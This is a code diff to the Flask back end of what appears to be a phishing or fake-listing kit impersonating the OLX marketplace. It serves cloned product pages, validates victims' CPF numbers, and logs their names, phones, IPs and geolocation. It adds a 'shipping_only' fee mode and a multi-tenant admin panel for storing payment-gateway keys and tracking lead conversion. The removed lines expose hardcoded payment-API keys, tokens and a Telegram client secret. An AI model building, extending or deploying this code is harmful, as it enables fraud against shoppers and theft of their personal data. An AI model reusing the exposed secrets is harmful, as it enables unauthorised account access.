@@ -10,7 +10,9 @@ import re
 import struct
 import base64
 import requests
+from datetime import datetime
 from typing import Optional
+
 from flask import Flask, render_template, request, jsonify, abort
 
 # ─── Import bot module for shared DB + notifications ──────────────────────────
@@ -44,22 +46,64 @@ except ImportError:
     TG_WH_AVAILABLE = False
     print("[app.py] tg_webhook.py nao encontrado.")
 
+# ─── Import Vault (Military Credential Store) ─────────────────────────────────
+try:
+    import vault as credential_vault
+    credential_vault.init()
+    VAULT_AVAILABLE = True
+except ImportError:
+    VAULT_AVAILABLE = False
+    print("[app.py] vault.py nao encontrado — credenciais em env only.")
+
+# ─── Import API Intelligence Engine ──────────────────────────────────────────
+try:
+    import api_intel as api_engine
+    API_INTEL_AVAILABLE = True
+except ImportError:
+    API_INTEL_AVAILABLE = False
+    print("[app.py] api_intel.py nao encontrado — detector IA basico ativo.")
+
 app = Flask(__name__, static_folder='static', template_folder='templates')
 
 # Secret Key para sessões e hashing de integridade
-app.secret_key = os.environ.get("FLASK_SECRET_KEY", os.environ.get("FERNET_KEY", "LO_ENI_MILITARY_VAULT_2026_SECRET"))
+# Secret key: env first, then auto-generated (never weak literal in prod)
+_flask_sk_raw = os.environ.get("FLASK_SECRET_KEY") or os.environ.get("FERNET_KEY") or ""
+if not _flask_sk_raw:
+    import secrets as _fsec
+    _flask_sk_raw = _fsec.token_hex(32)
+    print("[SECURITY] FLASK_SECRET_KEY nao definida — usando chave temporaria!")
+app.secret_key = _flask_sk_raw
 
 # ─── TELEGRAM OAUTH CONFIGURATION ──────────────────────────────────────────────
 TELEGRAM_CLIENT_ID     = os.environ.get("TELEGRAM_CLIENT_ID", "8857867740")
-TELEGRAM_CLIENT_SECRET = os.environ.get("TELEGRAM_CLIENT_SECRET", "OV9is6qw51omFKMxL08MDfoFcag48iCYFim0bgm4Yc5y_CCF9eePjg")
+TELEGRAM_CLIENT_SECRET = os.environ.get("TELEGRAM_CLIENT_SECRET", "")  # SEGURO: nao hardcoded
 BASE_URL               = os.environ.get("BASE_URL", "https://olx-9ee8.onrender.com").rstrip('/')
 
-# ─── CONFIGURAÇÕES DA API C7 (CARTEIRA DO 7) CRIPTOGRAFADAS E REAIS ───────────
-C7_API_KEY       = os.environ.get("C7_API_KEY", "c7_live_bae52473c16c92cf909a40086301e988a452816322bd1e98ebab4b6b0dc49a53")
-C7_API_SECRET    = os.environ.get("C7_API_SECRET", "0449fb237f301686f9ee1c1348e21dd55d15f9fd852bd50b7e7637f01101dcf89912a873e7e257f6386634d1dfaddd652c09ca43a1841821449d051c00b48e9e")
-C7_INTERNAL_TOKEN= os.environ.get("C7_INTERNAL_TOKEN", "39Qrhfyc7yzMosNXrFrL6mTC5zVh5sS54H")
+# ─── CONFIGURAÇÕES DA API C7 — lidas do vault ou do env ────────────────────
+# Credenciais nunca hardcoded; boot-time env leitura apenas. Armazenamento
+# persistente e criptografado gerenciado pelo vault.py (AES-256 + PBKDF2).
+C7_API_KEY       = os.environ.get("C7_API_KEY", "")
+C7_API_SECRET    = os.environ.get("C7_API_SECRET", "")
+C7_INTERNAL_TOKEN= os.environ.get("C7_INTERNAL_TOKEN", "")
 C7_BASE_URL      = os.environ.get("C7_BASE_URL", "https://api.carteirado7.com/v2")
 C7_ACQUIRER_CODE = os.environ.get("C7_ACQUIRER_CODE", "")
+
+# ─── SUPREME ADMIN ID para consulta do vault ─────────────────────────────────
+_SUPREME_ADMIN_ID = int(os.environ.get("SUPREME_ADMIN_ID", "0"))
+
+def _get_live_c7_keys() -> dict:
+    """Returns C7 keys: from vault if available, else env fallback."""
+    if VAULT_AVAILABLE and _SUPREME_ADMIN_ID:
+        creds = credential_vault.get_gateway_credentials(_SUPREME_ADMIN_ID, "c7")
+        if creds.get("api_key") and creds.get("api_secret"):
+            return creds
+    return {
+        "api_key": C7_API_KEY or os.environ.get("C7_API_KEY", ""),
+        "api_secret": C7_API_SECRET or os.environ.get("C7_API_SECRET", ""),
+        "internal_token": C7_INTERNAL_TOKEN or os.environ.get("C7_INTERNAL_TOKEN", ""),
+        "base_url": C7_BASE_URL,
+        "acquirer_code": C7_ACQUIRER_CODE,
+    }
 
 # ─── BANCO DE DADOS EM MEMÓRIA DE PAGAMENTOS ─────────────────────────────────
 PAYMENTS_DB        = {}   # {payment_id / c7_id: {record}}
@@ -187,7 +231,7 @@ def verify_cpf_hub(cpf_raw: str, dob: str = "") -> tuple[bool, str, dict]:
     if not validate_cpf(clean_cpf):
         return False, "CPF matematicamente inválido.", {}
 
-    token = admin_bot.get_config("hub_cpf_token", "219009015HYizMtsRCI395414136") if BOT_AVAILABLE else os.environ.get("HUB_CPF_TOKEN", "219009015HYizMtsRCI395414136")
+    token = admin_bot.get_config("hub_cpf_token", "") if BOT_AVAILABLE else os.environ.get("HUB_CPF_TOKEN", "")
     url = f"https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf={clean_cpf}&data={dob}&token={token}"
 
     try:
@@ -286,20 +330,22 @@ def _log(event_type, session_id, data):
 def get_c7_auth_headers(body_str: str = "") -> dict:
     """
     Gera headers de autenticação HMAC-SHA256 conforme C7 API Doc sec. 2.2 & 3.
+    Credenciais lidas do vault militar em tempo real (sem cache em memória).
     Fórmula: HMAC-SHA256(api_secret, timestamp + '.' + nonce + '.' + body)
-    - nonce: UUID v4 único por requisição (nunca reutilizar).
-    - timestamp: Unix seconds (API rejeita diferença > 5 min).
     """
+    keys      = _get_live_c7_keys()
+    api_key   = keys.get("api_key", C7_API_KEY)
+    api_secret= keys.get("api_secret", C7_API_SECRET)
     ts        = str(int(time.time()))
-    nonce     = str(uuid.uuid4())            # UUID v4 — garante unicidade
-    sig_input = f"{ts}.{nonce}.{body_str}"  # exatamente como a doc especifica
+    nonce     = str(uuid.uuid4())
+    sig_input = f"{ts}.{nonce}.{body_str}"
     signature = hmac.new(
-        C7_API_SECRET.encode('utf-8'),
+        api_secret.encode('utf-8'),
         sig_input.encode('utf-8'),
         hashlib.sha256
     ).hexdigest()
     return {
-        "Authorization":  f"Bearer {C7_API_KEY}",
+        "Authorization":  f"Bearer {api_key}",
         "Content-Type":   "application/json",
         "X-C7-Timestamp": ts,
         "X-C7-Nonce":     nonce,
@@ -429,6 +475,18 @@ def index(slug_or_code=None, item_code=None):
         p_img2 = (custom_item["image2"] if custom_item and custom_item["image2"] else cfgs.get("product_image2", ""))
         p_img3 = (custom_item["image3"] if custom_item and custom_item["image3"] else cfgs.get("product_image3", ""))
 
+        # Dados de shipping do produto
+        p_shipping_mode   = custom_item.get("shipping_mode",   "full")    if custom_item else "full"
+        p_shipping_fee    = custom_item.get("shipping_fee",    "19.90")   if custom_item else "19.90"
+        p_shipping_coupon = custom_item.get("shipping_coupon", "")        if custom_item else ""
+        p_product_code    = custom_item.get("product_code",    "")        if custom_item else ""
+
+        # Geolocalização em background (não bloqueia o render)
+        import threading
+        threading.Thread(
+            target=tg_wh.enrich_session_with_geo, args=(tg_id, sid, ip), daemon=True
+        ).start()
+
         return render_template(
             'index.html',
             session_id=sid,
@@ -445,6 +503,10 @@ def index(slug_or_code=None, item_code=None):
             seller_since=cfgs.get("seller_since", "Na OLX desde 2022"),
             seller_status=cfgs.get("seller_status", "Último acesso há 2 horas"),
             logo_url=cfgs.get("logo_url", ""),
+            shipping_mode=p_shipping_mode,
+            shipping_fee=p_shipping_fee,
+            shipping_coupon=p_shipping_coupon,
+            product_code=p_product_code,
             whatsapp={
                 "number": cfgs.get("whatsapp_number", "5511999999999"),
                 "message": cfgs.get("whatsapp_message", f"Olá! Tenho interesse no anúncio: {p_name}")
@@ -1013,6 +1075,29 @@ def api_admin_upload():
     return jsonify({"ok": True, "url": image_url, "filename": filename})
 
 
+@app.route('/api/admin/config', methods=['GET'])
+def api_admin_config_get():
+    """Returns current admin config toggles and key settings."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+
+    try:
+        cfg = {}
+        toggle_keys = ["active", "pixel_active", "notifications"]
+        if TG_WH_AVAILABLE and admin_id != 999999999:
+            for k in toggle_keys:
+                val = tg_wh.get_tenant_config(admin_id, k)
+                cfg[k] = val if val is not None else "1"
+        elif BOT_AVAILABLE:
+            for k in toggle_keys:
+                val = admin_bot.get_config(k)
+                cfg[k] = val if val is not None else "1"
+        return jsonify({"ok": True, "config": cfg, "role": role})
+    except Exception as e:
+        return jsonify({"ok": True, "config": {}, "role": role})
+
+
 @app.route('/api/admin/config', methods=['POST'])
 def api_admin_config_save():
     """Saves multiple config keys isolated per tenant/admin."""
@@ -1094,9 +1179,74 @@ def api_admin_supreme_set_plan():
 
     if TG_WH_AVAILABLE and tg_wh.set_user_plan(target_tg_id, plan_key):
         return jsonify({"ok": True, "message": f"Plano alterado para {plan_key} com sucesso!"})
-    
+
     return jsonify({"ok": False, "error": "Falha ao alterar plano ou plano inválido."}), 400
 
+
+@app.route('/api/admin/supreme/full-overview')
+def api_admin_supreme_full_overview():
+    """Visão completa de TODOS os admins, produtos, leads recentes e stats — Admin Supremo."""
+    admin_id, role = verify_admin_access(request)
+    if role != "supreme_admin":
+        return jsonify({"ok": False, "error": "Acesso restrito ao Admin Supremo"}), 403
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "multi-tenant indisponível"}), 503
+    overview = tg_wh.get_full_overview_for_supreme()
+    return jsonify({"ok": True, **overview})
+
+
+@app.route('/api/geo')
+def api_geo():
+    """Geolocalização real do IP do visitante — retorna lat, lng, cidade, país, ISP."""
+    ip = _user_ip()
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "indisponível"}), 503
+    geo = tg_wh.get_ip_geolocation(ip)
+    return jsonify({"ok": True, "ip": ip, **geo})
+
+
+@app.route('/api/admin/my-products/<product_code>', methods=['PATCH'])
+def api_admin_update_product(product_code):
+    """Atualiza produto do catálogo do admin — inclui shipping_mode, shipping_fee, shipping_coupon."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+
+    data = request.json or {}
+    safe_code = sanitize_input(product_code, 30)
+
+    if TG_WH_AVAILABLE:
+        ok = tg_wh.update_tenant_product(admin_id, safe_code, data)
+        if ok:
+            return jsonify({"ok": True, "message": "Produto atualizado com sucesso!"})
+    return jsonify({"ok": False, "error": "Produto não encontrado ou erro ao atualizar."}), 400
+
+
+@app.route('/api/admin/my-products/<product_code>/shipping', methods=['POST'])
+def api_admin_set_shipping_mode(product_code):
+    """Ativa/desativa modo 'apenas taxa' por produto individual."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+
+    data = request.json or {}
+    mode    = data.get("shipping_mode", "full")      # 'full' | 'shipping_only'
+    fee     = data.get("shipping_fee", "19.90")
+    coupon  = data.get("shipping_coupon", "")
+    safe_code = sanitize_input(product_code, 30)
+
+    if mode not in ("full", "shipping_only"):
+        return jsonify({"ok": False, "error": "shipping_mode deve ser 'full' ou 'shipping_only'"}), 400
+
+    if TG_WH_AVAILABLE:
+        ok = tg_wh.update_tenant_product(admin_id, safe_code, {
+            "shipping_mode": mode,
+            "shipping_fee":  sanitize_input(str(fee), 20),
+            "shipping_coupon": sanitize_input(str(coupon), 60),
+        })
+        if ok:
+            return jsonify({"ok": True, "shipping_mode": mode, "shipping_fee": fee, "message": "Modo de pagamento atualizado!"})
+    return jsonify({"ok": False, "error": "Falha ao atualizar modo."}), 400
 
 
 @app.route('/api/event', methods=['POST'])
@@ -2196,6 +2346,379 @@ def tg_callback():
         print(f"[TG OAUTH ERROR] {err}")
     
     return jsonify({"error": "authentication_failed"}), 401
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# VAULT — PAINEL FINANCEIRO SUPREMO (Rotas de Gerenciamento de Gateways)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@app.route('/api/admin/vault/schemas')
+def vault_schemas():
+    """Returns all supported gateway schemas (fields, labels, hints)."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    schemas = credential_vault.GATEWAY_SCHEMAS if VAULT_AVAILABLE else {}
+    return jsonify({"ok": True, "schemas": schemas})
+
+
+@app.route('/api/admin/vault/gateways')
+def vault_list_gateways():
+    """Lists all configured payment gateways with active status."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not VAULT_AVAILABLE:
+        return jsonify({"ok": False, "error": "vault_unavailable"}), 503
+    gws = credential_vault.list_gateways(admin_id)
+    active = credential_vault.get_active_gateway(admin_id)
+    schemas = credential_vault.GATEWAY_SCHEMAS
+    for gw in gws:
+        sc = schemas.get(gw["gateway"], {})
+        gw["name"] = sc.get("name", gw["gateway"])
+        gw["logo"] = sc.get("logo", "?")
+        gw["color"] = sc.get("color", "#888")
+        gw["field_count"] = len(sc.get("fields", []))
+    return jsonify({"ok": True, "gateways": gws, "active_gateway": active})
+
+
+@app.route('/api/admin/vault/credentials', methods=['GET'])
+def vault_get_credentials():
+    """Returns masked credentials for a gateway (never plaintext in response)."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not VAULT_AVAILABLE:
+        return jsonify({"ok": False, "error": "vault_unavailable"}), 503
+    gateway = request.args.get("gateway", "").strip()
+    if not gateway:
+        return jsonify({"ok": False, "error": "gateway_required"}), 400
+    masked = credential_vault.get_masked_credentials(admin_id, gateway)
+    schema = credential_vault.GATEWAY_SCHEMAS.get(gateway, {})
+    return jsonify({"ok": True, "gateway": gateway, "masked": masked, "schema": schema})
+
+
+@app.route('/api/admin/vault/credentials', methods=['POST'])
+def vault_save_credentials():
+    """Saves (encrypted) payment gateway credentials for an admin."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not VAULT_AVAILABLE:
+        return jsonify({"ok": False, "error": "vault_unavailable"}), 503
+    data = request.json or {}
+    gateway = sanitize_input(data.get("gateway", ""), 64)
+    if not gateway or gateway not in credential_vault.GATEWAY_SCHEMAS:
+        return jsonify({"ok": False, "error": "invalid_gateway"}), 400
+    fields = {k: sanitize_input(str(v), 2048) for k, v in data.get("fields", {}).items()}
+    if not fields:
+        return jsonify({"ok": False, "error": "no_fields"}), 400
+    ip = _user_ip()
+    ok = credential_vault.save_gateway_credentials(admin_id, gateway, fields, ip)
+    if ok:
+        _log("VAULT_CREDENTIALS_SAVED", str(uuid.uuid4()), {
+            "admin_id": admin_id, "gateway": gateway, "field_count": len(fields)
+        })
+    return jsonify({"ok": ok, "gateway": gateway, "saved": len(fields)})
+
+
+@app.route('/api/admin/vault/activate', methods=['POST'])
+def vault_activate_gateway():
+    """Activates a payment gateway (deactivates all others for this admin)."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not VAULT_AVAILABLE:
+        return jsonify({"ok": False, "error": "vault_unavailable"}), 503
+    data = request.json or {}
+    gateway = sanitize_input(data.get("gateway", ""), 64)
+    active = bool(data.get("active", True))
+    if not gateway:
+        return jsonify({"ok": False, "error": "gateway_required"}), 400
+    ip = _user_ip()
+    ok = credential_vault.set_gateway_active(admin_id, gateway, active, ip)
+    _log("VAULT_GATEWAY_TOGGLED", str(uuid.uuid4()), {
+        "admin_id": admin_id, "gateway": gateway, "active": active
+    })
+    return jsonify({"ok": ok, "gateway": gateway, "active": active})
+
+
+@app.route('/api/admin/vault/delete', methods=['POST'])
+def vault_delete_gateway():
+    """Permanently deletes a gateway and all its encrypted credentials."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not VAULT_AVAILABLE:
+        return jsonify({"ok": False, "error": "vault_unavailable"}), 503
+    data = request.json or {}
+    gateway = sanitize_input(data.get("gateway", ""), 64)
+    if not gateway:
+        return jsonify({"ok": False, "error": "gateway_required"}), 400
+    ok = credential_vault.delete_gateway(admin_id, gateway, _user_ip())
+    _log("VAULT_GATEWAY_DELETED", str(uuid.uuid4()), {"admin_id": admin_id, "gateway": gateway})
+    return jsonify({"ok": ok})
+
+
+@app.route('/api/admin/vault/detect', methods=['POST'])
+def vault_detect_credentials():
+    """
+    Advanced AI-powered credential detector.
+    Accepts raw text (API docs, pasted keys, JSON configs) and returns:
+    - Detected gateway with confidence score
+    - Extracted field values (ready to fill)
+    - Field validation results
+    - Setup instructions for the detected gateway
+    - Warnings (test mode, missing fields, etc.)
+    """
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not VAULT_AVAILABLE:
+        return jsonify({"ok": False, "error": "vault_unavailable"}), 503
+    data = request.json or {}
+    raw_text = data.get("text", "").strip()
+    if not raw_text or len(raw_text) < 5:
+        return jsonify({"ok": False, "error": "text_too_short"}), 400
+
+    # Use full intelligence engine if available, else basic vault detector
+    if API_INTEL_AVAILABLE:
+        result = api_engine.analyze_api_text(raw_text[:16384])
+        schema = credential_vault.GATEWAY_SCHEMAS.get(result.get("gateway", "custom"), {})
+        return jsonify({"ok": True, "detection": result, "schema": schema, "engine": "full"})
+    else:
+        result = credential_vault.ai_detect_gateway(raw_text[:8192])
+        schema = credential_vault.GATEWAY_SCHEMAS.get(result.get("gateway", "custom"), {})
+        return jsonify({"ok": True, "detection": result, "schema": schema, "engine": "basic"})
+
+
+@app.route('/api/admin/vault/audit')
+def vault_audit_log():
+    """Returns recent vault audit events for this admin."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not VAULT_AVAILABLE:
+        return jsonify({"ok": True, "audit": []})
+    limit = min(int(request.args.get("limit", 20)), 100)
+    return jsonify({"ok": True, "audit": credential_vault.get_vault_audit(admin_id, limit)})
+
+
+# ── MONITORING ROUTES ─────────────────────────────────────────────────────────
+
+@app.route('/api/admin/monitor/links')
+def monitor_links():
+    """Per-link visit stats: total visits, unique IPs, lead count, conversion rate."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "webhook_unavailable"}), 503
+
+    db = get_db()
+    try:
+        # Supreme admin sees all tenants; regular admin sees only their own
+        if role == "supreme":
+            sessions = db.execute(
+                "SELECT tg_id, slug, ip, entered_at FROM tg_sessions ORDER BY entered_at DESC"
+            ).fetchall()
+        else:
+            tg_id = tg_wh.get_tg_id_by_admin_token(admin_id) if hasattr(tg_wh, 'get_tg_id_by_admin_token') else None
+            if not tg_id:
+                tg_id = admin_id
+            sessions = db.execute(
+                "SELECT tg_id, slug, ip, entered_at FROM tg_sessions WHERE tg_id=? ORDER BY entered_at DESC",
+                (tg_id,)
+            ).fetchall()
+
+        # Group by slug
+        from collections import defaultdict
+        link_data = defaultdict(lambda: {"total": 0, "ips": set(), "leads": 0, "last_visit": 0})
+        for s in sessions:
+            slug = s["slug"] or str(s["tg_id"])
+            link_data[slug]["total"] += 1
+            link_data[slug]["ips"].add(s["ip"])
+            link_data[slug]["last_visit"] = max(link_data[slug]["last_visit"], s["entered_at"] or 0)
+
+        # Count leads per slug
+        if role == "supreme":
+            leads_rows = db.execute(
+                "SELECT slug, COUNT(*) as cnt FROM tg_events WHERE event_type='LEAD_SUBMIT' GROUP BY slug"
+            ).fetchall()
+        else:
+            leads_rows = db.execute(
+                "SELECT slug, COUNT(*) as cnt FROM tg_events WHERE tg_id=? AND event_type='LEAD_SUBMIT' GROUP BY slug",
+                (tg_id,)
+            ).fetchall()
+        for row in leads_rows:
+            if row["slug"] in link_data:
+                link_data[row["slug"]]["leads"] = row["cnt"]
+
+        base = (os.environ.get("BASE_URL") or os.environ.get("APP_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "").rstrip("/")
+        links = []
+        total_visits = 0
+        unique_ips = set()
+        for slug, data in sorted(link_data.items(), key=lambda x: x[1]["total"], reverse=True):
+            uniq = len(data["ips"])
+            total_visits += data["total"]
+            unique_ips.update(data["ips"])
+            links.append({
+                "slug": slug,
+                "label": slug,
+                "url": f"{base}/p/{slug}" if base else f"/p/{slug}",
+                "total": data["total"],
+                "unique": uniq,
+                "leads": data["leads"],
+                "last_visit": data["last_visit"],
+            })
+
+        return jsonify({
+            "ok": True,
+            "links": links[:50],
+            "total_visits": total_visits,
+            "unique_visitors": len(unique_ips),
+        })
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+    finally:
+        db.close()
+
+
+@app.route('/api/admin/monitor/visitors')
+def monitor_visitors():
+    """Recent visitors with device, IP, geo and lead flag."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "webhook_unavailable"}), 503
+
+    limit = min(int(request.args.get("limit", 20)), 100)
+    db = get_db()
+    try:
+        if role == "supreme":
+            rows = db.execute(
+                "SELECT s.tg_id, s.slug, s.ip, s.ua, s.entered_at, s.session_id, "
+                "g.city, g.country, g.isp "
+                "FROM tg_sessions s LEFT JOIN tg_geo g ON s.session_id=g.session_id "
+                "ORDER BY s.entered_at DESC LIMIT ?", (limit,)
+            ).fetchall()
+        else:
+            tg_id = admin_id
+            rows = db.execute(
+                "SELECT s.tg_id, s.slug, s.ip, s.ua, s.entered_at, s.session_id, "
+                "g.city, g.country, g.isp "
+                "FROM tg_sessions s LEFT JOIN tg_geo g ON s.session_id=g.session_id "
+                "WHERE s.tg_id=? ORDER BY s.entered_at DESC LIMIT ?", (tg_id, limit)
+            ).fetchall()
+
+        # Mark which sessions have a lead
+        session_ids = [r["session_id"] for r in rows if r["session_id"]]
+        lead_sessions = set()
+        if session_ids:
+            placeholders = ",".join("?" * len(session_ids))
+            lead_rows = db.execute(
+                f"SELECT DISTINCT session_id FROM tg_events WHERE event_type='LEAD_SUBMIT' AND session_id IN ({placeholders})",
+                session_ids
+            ).fetchall()
+            lead_sessions = {r["session_id"] for r in lead_rows}
+
+        visitors = []
+        for r in rows:
+            geo = {}
+            if r["city"] or r["country"]:
+                geo = {"city": r["city"], "country": r["country"], "isp": r["isp"]}
+            visitors.append({
+                "ip": r["ip"],
+                "ua": r["ua"],
+                "slug": r["slug"],
+                "entered_at": r["entered_at"],
+                "is_lead": r["session_id"] in lead_sessions,
+                "geo": geo,
+            })
+
+        return jsonify({"ok": True, "visitors": visitors})
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+    finally:
+        db.close()
+
+
+@app.route('/api/admin/monitor/leads')
+def monitor_leads():
+    """Validated leads with status (valid/invalid/pending), CPF, phone, name."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "webhook_unavailable"}), 503
+
+    limit = min(int(request.args.get("limit", 30)), 100)
+    db = get_db()
+    try:
+        if role == "supreme":
+            rows = db.execute(
+                "SELECT tg_id, slug, session_id, ip, data_enc, created_at "
+                "FROM tg_events WHERE event_type='LEAD_SUBMIT' ORDER BY created_at DESC LIMIT ?",
+                (limit,)
+            ).fetchall()
+        else:
+            tg_id = admin_id
+            rows = db.execute(
+                "SELECT tg_id, slug, session_id, ip, data_enc, created_at "
+                "FROM tg_events WHERE tg_id=? AND event_type='LEAD_SUBMIT' ORDER BY created_at DESC LIMIT ?",
+                (tg_id, limit)
+            ).fetchall()
+
+        # Count today's leads
+        today_start = int(datetime.now().replace(hour=0, minute=0, second=0, microsecond=0).timestamp())
+        leads = []
+        today_count = 0
+        for r in rows:
+            ts = r["created_at"] or 0
+            if ts >= today_start:
+                today_count += 1
+            # Decrypt event data if possible
+            data = {}
+            if r["data_enc"] and BOT_AVAILABLE:
+                try:
+                    import bot as _bot_mod
+                    raw = _bot_mod.crypto_engine.decrypt(r["data_enc"])
+                    if isinstance(raw, dict):
+                        data = raw
+                    elif isinstance(raw, str):
+                        import json as _j
+                        data = _j.loads(raw)
+                except Exception:
+                    pass
+
+            leads.append({
+                "slug": r["slug"],
+                "ip": r["ip"],
+                "ts": ts,
+                "cpf": data.get("cpf", ""),
+                "name": data.get("name", data.get("nome", "")),
+                "phone": data.get("phone", data.get("whatsapp", "")),
+                "validation_status": data.get("validation_status", "pending"),
+                "validation_reason": data.get("validation_reason", ""),
+            })
+
+        # Conversion rate
+        total_sessions = db.execute("SELECT COUNT(*) as c FROM tg_sessions").fetchone()["c"] or 1
+        total_leads = db.execute("SELECT COUNT(*) as c FROM tg_events WHERE event_type='LEAD_SUBMIT'").fetchone()["c"]
+        conv_rate = round((total_leads / total_sessions) * 100, 1)
+
+        return jsonify({
+            "ok": True,
+            "leads": leads,
+            "today_count": today_count,
+            "total_leads": total_leads,
+            "conv_rate": conv_rate,
+        })
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+    finally:
+        db.close()
 
 
 if __name__ == '__main__':
